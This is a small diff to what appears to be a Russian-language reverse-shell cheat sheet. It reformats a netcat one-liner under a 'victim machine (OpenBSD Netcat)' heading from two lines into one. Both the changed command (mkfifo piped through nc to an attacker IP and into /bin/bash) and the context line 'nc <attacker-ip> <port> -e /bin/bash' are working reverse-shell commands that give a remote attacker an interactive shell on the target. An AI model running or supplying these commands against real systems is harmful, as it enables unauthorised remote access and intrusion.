@@ -15,6 +15,5 @@ nc <attacker-ip> <port> -e /bin/bash
 
 ## Машина жертвы (OpenBSD Netcat)
 ```shell
-mkfifo /tmp/rev; nc <attacker-ip> <port> < /tmp/rev \
-	| /bin/bash 2>&1 | tee /tmp/rev > /dev/null
+mkfifo /tmp/rev; nc <attacker-ip> <port> < /tmp/rev | /bin/bash 2>&1 | tee /tmp/rev > /dev/null
 ```
